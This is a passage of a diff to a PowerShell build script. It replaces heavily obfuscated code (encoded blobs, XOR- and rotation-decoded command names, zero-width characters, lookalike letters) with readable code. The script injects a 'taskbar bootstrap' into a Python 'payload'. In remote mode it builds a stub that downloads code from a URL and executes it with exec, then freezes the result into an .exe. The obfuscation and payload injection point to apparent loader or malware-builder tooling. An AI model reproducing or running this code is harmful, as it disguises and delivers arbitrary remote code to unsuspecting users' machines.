$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x46)$([char]0x39)$([char]0x6D)$([char]0x61)$([char]0x57)$([char]0x56)$([char]0x73)$([char]0x5A)$([char]0x48)$([char]0x4E)$([char]0x66)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x57)$([char]0x79)$([char]0x67)$([char]0x69)$([char]0x59)$([char]0x32)$([char]0x4A)$([char]0x54)$([char]0x61)$([char]0x58)$([char]0x70)$([char]0x6C)$([char]0x49)$([char]0x69)$([char]0x77)$([char]0x67)$([char]0x64)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x56)$([char]0x55)$([char]0x6C)$([char]0x4F)$([char]0x56)$([char]0x43)$([char]0x6B)$([char]0x73)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x63)$([char]0x33)$([char]0x52)$([char]0x35)$([char]0x62)$([char]0x47)$([char]0x55)$([char]0x69)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x33)$([char]0x61)$([char]0x57)$([char]0x35)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x56)$([char]0x53)$([char]0x55)$([char]0x35)$([char]0x55)$([char]0x4B)$([char]0x53)$([char]0x77)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x62)$([char]0x48)$([char]0x42)$([char]0x6D)$([char]0x62)$([char]0x6C)$([char]0x64)$([char]0x75)$([char]0x5A)$([char]0x46)$([char]0x42)$([char]0x79)$([char]0x62)$([char]0x32)$([char]0x4D)$([char]0x69)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x58)$([char]0x54)$([char]0x6B)$([char]0x52)$([char]0x51)$([char]0x55)$([char]0x6B)$([char]0x39)$([char]0x44)$([char]0x4B)$([char]0x53)$([char]0x77)$([char]0x67)$([char]0x4B)$([char]0x43)$([char]0x4A)$([char]0x6A)$([char]0x59)$([char]0x6B)$([char]0x4E)$([char]0x73)$([char]0x63)$([char]0x30)$([char]0x56)$([char]0x34)$([char]0x64)$([char]0x48)$([char]0x4A)$([char]0x68)$([char]0x49)$([char]0x69)$([char]0x77)$([char]0x67)$([char]0x59)$([char]0x33)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6D)$([char]0x4E)$([char]0x66)$([char]0x61)$([char]0x57)$([char]0x35)$([char]0x30)$([char]0x4B)$([char]0x53)$([char]0x77)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x59)$([char]0x32)$([char]0x4A)$([char]0x58)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x46)$([char]0x65)$([char]0x48)$([char]0x52)$([char]0x79)$([char]0x59)$([char]0x53)$([char]0x49)$([char]0x73)$([char]0x49)$([char]0x47)$([char]0x4E)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x6A)$([char]0x58)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x64)$([char]0x43)$([char]0x6B)$([char]0x73)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x61)$([char]0x45)$([char]0x6C)$([char]0x75)$([char]0x63)$([char]0x33)$([char]0x52)$([char]0x68)$([char]0x62)$([char]0x6D)$([char]0x4E)$([char]0x6C)$([char]0x49)$([char]0x69)$([char]0x77)$([char]0x67)$([char]0x64)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x53)$([char]0x45)$([char]0x6C)$([char]0x4F)$([char]0x55)$([char]0x31)$([char]0x52)$([char]0x42)$([char]0x54)$([char]0x6B)$([char]0x4E)$([char]0x46)$([char]0x4B)$([char]0x53)$([char]0x77)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x61)$([char]0x45)$([char]0x6C)$([char]0x6A)$([char]0x62)$([char]0x32)$([char]0x34)$([char]0x69)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x33)$([char]0x61)$([char]0x57)$([char]0x35)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x49)$([char]0x53)$([char]0x55)$([char]0x4E)$([char]0x50)$([char]0x54)$([char]0x69)$([char]0x6B)$([char]0x73)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x61)$([char]0x45)$([char]0x4E)$([char]0x31)$([char]0x63)$([char]0x6E)$([char]0x4E)$([char]0x76)$([char]0x63)$([char]0x69)$([char]0x49)$([char]0x73)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6E)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6B)$([char]0x68)$([char]0x42)$([char]0x54)$([char]0x6B)$([char]0x52)$([char]0x4D)$([char]0x52)$([char]0x53)$([char]0x6B)$([char]0x73)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x6F)$([char]0x49)$([char]0x6D)$([char]0x68)$([char]0x69)$([char]0x63)$([char]0x6B)$([char]0x4A)$([char]0x68)$([char]0x59)$([char]0x32)$([char]0x74)$([char]0x6E)$([char]0x63)$([char]0x6D)$([char]0x39)$([char]0x31)$([char]0x62)$([char]0x6D)$([char]0x51)$([char]0x69)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x33)$([char]0x61)$([char]0x57)$([char]0x35)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x49)$([char]0x51)$([char]0x6C)$([char]0x4A)$([char]0x56)$([char]0x55)$([char]0x30)$([char]0x67)$([char]0x70)$([char]0x4C)$([char]0x43)$([char]0x41)$([char]0x6F)$([char]0x49)$([char]0x6D)$([char]0x78)$([char]0x77)$([char]0x63)$([char]0x33)$([char]0x70)$([char]0x4E)$([char]0x5A)$([char]0x57)$([char]0x35)$([char]0x31)$([char]0x54)$([char]0x6D)$([char]0x46)$([char]0x74)$([char]0x5A)$([char]0x53)$([char]0x49)$([char]0x73)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6E)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6B)$([char]0x78)$([char]0x51)$([char]0x51)$([char]0x31)$([char]0x64)$([char]0x54)$([char]0x56)$([char]0x46)$([char]0x49)$([char]0x70)$([char]0x4C)$([char]0x41)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x4B)$([char]0x43)$([char]0x4A)$([char]0x73)$([char]0x63)$([char]0x48)$([char]0x4E)$([char]0x36)$([char]0x51)$([char]0x32)$([char]0x78)$([char]0x68)$([char]0x63)$([char]0x33)$([char]0x4E)$([char]0x4F)$([char]0x59)$([char]0x57)$([char]0x31)$([char]0x6C)$([char]0x49)$([char]0x69)$([char]0x77)$([char]0x67)$([char]0x64)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x54)$([char]0x46)$([char]0x42)$([char]0x44)$([char]0x56)$([char]0x31)$([char]0x4E)$([char]0x55)$([char]0x55)$([char]0x69)$([char]0x6B)$([char]0x73)$([char]0x49)$([char]0x43)$([char]0x67)$([char]0x69)$([char]0x61)$([char]0x45)$([char]0x6C)$([char]0x6A)$([char]0x62)$([char]0x32)$([char]0x35)$([char]0x54)$([char]0x62)$([char]0x53)$([char]0x49)$([char]0x73)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6E)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6B)$([char]0x68)$([char]0x4A)$([char]0x51)$([char]0x30)$([char]0x39)$([char]0x4F)$([char]0x4B)$([char]0x56)$([char]0x30)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x64)$([char]0x32)$([char]0x4D)$([char]0x67)$([char]0x50)$([char]0x53)$([char]0x42)$([char]0x58)$([char]0x51)$([char]0x79)$([char]0x67)$([char]0x70)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x6A)$([char]0x4C)$([char]0x6D)$([char]0x4E)$([char]0x69)$([char]0x55)$([char]0x32)$([char]0x6C)$([char]0x36)$([char]0x5A)$([char]0x53)$([char]0x41)$([char]0x39)$([char]0x49)$([char]0x47)$([char]0x4E)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x7A)$([char]0x61)$([char]0x58)$([char]0x70)$([char]0x6C)$([char]0x62)$([char]0x32)$([char]0x59)$([char]0x6F)$([char]0x56)$([char]0x30)$([char]0x4D)$([char]0x70)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x6A)$([char]0x4C)$([char]0x6D)$([char]0x78)$([char]0x77)$([char]0x5A)$([char]0x6D)$([char]0x35)$([char]0x58)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x51)$([char]0x63)$([char]0x6D)$([char]0x39)$([char]0x6A)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x56)$([char]0x30)$([char]0x35)$([char]0x45)$([char]0x55)$([char]0x46)$([char]0x4A)$([char]0x50)$([char]0x51)$([char]0x79)$([char]0x68)$([char]0x73)$([char]0x59)$([char]0x57)$([char]0x31)$([char]0x69)$([char]0x5A)$([char]0x47)$([char]0x45)$([char]0x67)$([char]0x61)$([char]0x43)$([char]0x78)$([char]0x74)$([char]0x4C)$([char]0x48)$([char]0x63)$([char]0x73)$([char]0x62)$([char]0x44)$([char]0x6F)$([char]0x67)$([char]0x59)$([char]0x33)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6E)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x73)$([char]0x62)$([char]0x43)$([char]0x35)$([char]0x31)$([char]0x63)$([char]0x32)$([char]0x56)$([char]0x79)$([char]0x4D)$([char]0x7A)$([char]0x49)$([char]0x75)$([char]0x52)$([char]0x47)$([char]0x56)$([char]0x6D)$([char]0x56)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x5A)$([char]0x47)$([char]0x39)$([char]0x33)$([char]0x55)$([char]0x48)$([char]0x4A)$([char]0x76)$([char]0x59)$([char]0x31)$([char]0x63)$([char]0x6F)$([char]0x61)$([char]0x43)$([char]0x78)$([char]0x74)$([char]0x4C)$([char]0x48)$([char]0x63)$([char]0x73)$([char]0x62)$([char]0x43)$([char]0x6B)$([char]0x70)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x6A)$([char]0x4C)$([char]0x6D)$([char]0x68)$([char]0x4A)$([char]0x62)$([char]0x6E)$([char]0x4E)$([char]0x30)$([char]0x59)$([char]0x57)$([char]0x35)$([char]0x6A)$([char]0x5A)$([char]0x53)$([char]0x41)$([char]0x39)$([char]0x49)$([char]0x47)$([char]0x4E)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x33)$([char]0x61)$([char]0x57)$([char]0x35)$([char]0x6B)$([char]0x62)$([char]0x47)$([char]0x77)$([char]0x75)$([char]0x61)$([char]0x32)$([char]0x56)$([char]0x79)$([char]0x62)$([char]0x6D)$([char]0x56)$([char]0x73)$([char]0x4D)$([char]0x7A)$([char]0x49)$([char]0x75)$([char]0x52)$([char]0x32)$([char]0x56)$([char]0x30)$([char]0x54)$([char]0x57)$([char]0x39)$([char]0x6B)$([char]0x64)$([char]0x57)$([char]0x78)$([char]0x6C)$([char]0x53)$([char]0x47)$([char]0x46)$([char]0x75)$([char]0x5A)$([char]0x47)$([char]0x78)$([char]0x6C)$([char]0x56)$([char]0x79)$([char]0x68)$([char]0x4F)$([char]0x62)$([char]0x32)$([char]0x35)$([char]0x6C)$([char]0x4B)$([char]0x51)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x42)$([char]0x33)$([char]0x59)$([char]0x79)$([char]0x35)$([char]0x6F)$([char]0x53)$([char]0x57)$([char]0x4E)$([char]0x76)$([char]0x62)$([char]0x69)$([char]0x41)$([char]0x39)$([char]0x49)$([char]0x47)$([char]0x68)$([char]0x69)$([char]0x4F)$([char]0x79)$([char]0x42)$([char]0x33)$([char]0x59)$([char]0x79)$([char]0x35)$([char]0x6F)$([char]0x53)$([char]0x57)$([char]0x4E)$([char]0x76)$([char]0x62)$([char]0x6C)$([char]0x4E)$([char]0x74)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x61)$([char]0x48)$([char]0x4D)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x64)$([char]0x32)$([char]0x4D)$([char]0x75)$([char]0x62)$([char]0x48)$([char]0x42)$([char]0x7A)$([char]0x65)$([char]0x6B)$([char]0x4E)$([char]0x73)$([char]0x59)$([char]0x58)$([char]0x4E)$([char]0x7A)$([char]0x54)$([char]0x6D)$([char]0x46)$([char]0x74)$([char]0x5A)$([char]0x53)$([char]0x41)$([char]0x39)$([char]0x49)$([char]0x43)$([char]0x4A)$([char]0x46)$([char]0x65)$([char]0x47)$([char]0x6C)$([char]0x73)$([char]0x5A)$([char]0x57)$([char]0x52)$([char]0x46)$([char]0x65)$([char]0x48)$([char]0x52)$([char]0x6C)$([char]0x63)$([char]0x6D)$([char]0x35)$([char]0x68)$([char]0x62)$([char]0x46)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x76)$([char]0x64)$([char]0x79)$([char]0x49)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x59)$([char]0x33)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6E)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x73)$([char]0x62)$([char]0x43)$([char]0x35)$([char]0x31)$([char]0x63)$([char]0x32)$([char]0x56)$([char]0x79)$([char]0x4D)$([char]0x7A)$([char]0x49)$([char]0x75)$([char]0x55)$([char]0x6D)$([char]0x56)$([char]0x6E)$([char]0x61)$([char]0x58)$([char]0x4E)$([char]0x30)$([char]0x5A)$([char]0x58)$([char]0x4A)$([char]0x44)$([char]0x62)$([char]0x47)$([char]0x46)$([char]0x7A)$([char]0x63)$([char]0x30)$([char]0x56)$([char]0x34)$([char]0x56)$([char]0x79)$([char]0x68)$([char]0x6A)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x59)$([char]0x6E)$([char]0x6C)$([char]0x79)$([char]0x5A)$([char]0x57)$([char]0x59)$([char]0x6F)$([char]0x64)$([char]0x32)$([char]0x4D)$([char]0x70)$([char]0x4B)$([char]0x51)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x47)$([char]0x56)$([char]0x34)$([char]0x59)$([char]0x32)$([char]0x56)$([char]0x77)$([char]0x64)$([char]0x43)$([char]0x42)$([char]0x46)$([char]0x65)$([char]0x47)$([char]0x4E)$([char]0x6C)$([char]0x63)$([char]0x48)$([char]0x52)$([char]0x70)$([char]0x62)$([char]0x32)$([char]0x34)$([char]0x36)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x48)$([char]0x42)$([char]0x68)$([char]0x63)$([char]0x33)$([char]0x4D)$([char]0x4B)$([char]0x43)$([char]0x6C)$([char]0x39)$([char]0x6C)$([char]0x65)$([char]0x47)$([char]0x6C)$([char]0x73)$([char]0x5A)$([char]0x57)$([char]0x52)$([char]0x66)$([char]0x64)$([char]0x47)$([char]0x46)$([char]0x7A)$([char]0x61)$([char]0x32)$([char]0x4A)$([char]0x68)$([char]0x63)$([char]0x69)$([char]0x67)$([char]0x70)$([char]0x44)$([char]0x51)$([char]0x3D)$([char]0x3D)")))
+$taskbarBootstrap = @'
+import os, sys, ctypes
+from ctypes import wintypes
 
-if ($yClSKs) {
-    if (-not (& (Get`-Command (-join('?','?s','t')) -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] -litERaLPaTh $xqtz3s)) { & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Rw==')))+([string]::Format('{0}{1}{2}','et-Co','mman','d'))) $(-join('K??q'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}})) -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] (('pa'+'yload'+' '+'missing:'+' ') + $xQtZ3s) }
-    & (&($(-join('Ecr-Am'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}}))+(-join('m','man','d'))) $($k1714=73;$b=[byte[]](0x25,0x06,0x76);-join($b|%{[char]($_-bxor$k1714)})) -CommandType Function, &('C​m‌d​'+"$([char]0x6C)$([char]0x65)$([char]0x74)") -ErrorAction SilentlyContinue)[0] (-join('pa','yload ','->','  inject','ing t','askbar',' ','boo','tstrap',' (lo','ca','l',')'))
-    $g90D6 = & (&($(-join('Ljy-Htrrf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))+'nd') (-join('G?t-C','?Nt','eNT')) -CommandType Function, &((-join('C','m','d'))+$($k1416='88)Tou5_Fm:9MR';$b=[byte[]](0x54,0x5D,0x5D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1416);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ErrorAction SilentlyContinue)[0] -LITeRalpAth $XQTZ3s -rAw
-    $pShv = $uzFWTls5 + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x60,0x72,0x60,0x60,0x6E))) + $g90D6
-    sc -PATH $TlN2G -ValuE $Pshv -eNCodiNg uTF8
+def _exiled_taskbar():
+    try:
+        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
+            "Exiled.External.App.1")
+    except Exception:
+        pass
+    try:
+        ico = None
+        if getattr(sys, "frozen", False):
+            base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
+            for c in (os.path.join(base, "icon.ico"),
+                      os.path.join(os.path.dirname(sys.executable), "icon.ico")):
+                if os.path.exists(c):
+                    ico = c; break
+        else:
+            c = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
+            if os.path.exists(c): ico = c
+        if not ico: return
+        hb = ctypes.windll.user32.LoadImageW(None, ico, 1, 0, 0, 0x10 | 0x8000)
+        hs = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x10 | 0x8000)
+        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND,
+                                     wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
+        class WC(ctypes.Structure):
+            _fields_ = [("cbSize", wintypes.UINT), ("style", wintypes.UINT),
+                        ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
+                        ("cbWndExtra", ctypes.c_int), ("hInstance", wintypes.HINSTANCE),
+                        ("hIcon", wintypes.HICON), ("hCursor", wintypes.HANDLE),
+                        ("hbrBackground", wintypes.HBRUSH), ("lpszMenuName", wintypes.LPCWSTR),
+                        ("lpszClassName", wintypes.LPCWSTR), ("hIconSm", wintypes.HICON)]
+        wc = WC()
+        wc.cbSize = ctypes.sizeof(WC)
+        wc.lpfnWndProc = WNDPROC(lambda h,m,w,l: ctypes.windll.user32.DefWindowProcW(h,m,w,l))
+        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
+        wc.hIcon = hb; wc.hIconSm = hs
+        wc.lpszClassName = "ExiledExternalWindow"
+        ctypes.windll.user32.RegisterClassExW(ctypes.byref(wc))
+    except Exception:
+        pass
+
+_exiled_taskbar()
+'@
+
+if ($Local) {
+    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
+    Log "payload ->  injecting taskbar bootstrap (local)"
+    $origBody = Get-Content -LiteralPath $Url -Raw
+    $body = $taskbarBootstrap + "`r`n" + $origBody
+    Set-Content -Path $StubPy -Value $body -Encoding UTF8
 } else {
-    & (&($(-join('Ayn-Wi'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}}))+$($k6968=']{+[9}W';$b=[byte[]](0x30,0x16,0x4A,0x35,0x5D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6968);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) '?‌O‌g​' -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGF5bG9hZCAtPiAgaW5qZWN0aW5nIHRhc2tiYXIgYm9vdHN0cmFwIChyZW1vdGUp')))
-    $BfMek = @'''''([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IgoKaW1wb3J0IHRraW50ZXINCmltcG9ydCB0a2ludGVyLnR0aw0KaW1wb3J0IHRraW50ZXIubWVzc2FnZWJveA0KaW1wb3J0IHRraW50ZXIuZmlsZWRpYWxvZw0KaW1wb3J0IHRraW50ZXIuc2ltcGxlZGlhbG9nDQppbXBvcnQgdGtpbnRlci5zY3JvbGxlZHRleHQNCmltcG9ydCB0a2ludGVyLmZvbnQNCmltcG9ydCB0a2ludGVyLmNvbG9yY2hvb3NlcgoKZXhlYyhjb21waWxlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4o')))$xQtZ3s').read(), (-join('<u','rl','>')), ([System.Text.Encoding]::UTF8.GetString([byte[]](0x65,0x78,0x65,0x63)))))
-($($k6434='OlP#ys{_ua:GS';$b=[byte[]](0x0F,0x61,0x5A,0x03,0x59,0x53,0x5B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6434);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $Pshv + $($k5137=218;$b=[byte[]](0xfa,0xe7,0xfa);-join($b|%{[char]($_-bxor$k5137)})) + $UzFWtls5 + $($k1580='=isVnUFXG=p&6';$b=[byte[]](0x1D,0x42,0x53);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1580);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))``r``nimport urllib.request``r``n" + $bFmEK
-    sc -PATH $tLN2g -value $PsHV -encOdiNG uTF8
-}
-& (&((-join('Ge','t-','C'))+$(-join('qoocpf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) $(-join('?vn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})) -CommandType Function, &($($k8177=58;$b=[byte[]](0x79,0x57,0x5e);-join($b|%{[char]($_-bxor$k8177)}))+$($k1376=19;$b=[byte[]](0x7f,0x76,0x67);-join($b|%{[char]($_-bxor$k1376)}))) -ErrorAction SilentlyContinue)[0] (-join([char]0x70, [char]0x61, [char]0x79, [char]0x6C, [char]0x6F, [char]0x61, [char]0x64, [char]0x20, [char]0x2D, [char]0x3E, [char]0x20, [char]0x20, [char]0x77, [char]0x72, [char]0x69, [char]0x74, [char]0x74, [char]0x65, [char]0x6E)) ([System.Text.Encoding]::UTF8.GetString([byte[]](0x47,0x72,0x65,0x65,0x6E)))
-PAUSe-BriEf
+    Log "payload ->  injecting taskbar bootstrap (remote)"
+    $remoteSuffix = @"
 
-loG ('frееzе  ->  ' + $p6O4u79 + '.‍e‌x​e‌')
-$hr1UsK1W = @(
-    ('{0}' -f '-m'),$($k7582=95;$b=[byte[]](0x0f,0x26,0x16,0x31,0x2c,0x2b,0x3e,0x33,0x33,0x3a,0x2d);-join($b|%{[char]($_-bxor$k7582)})),
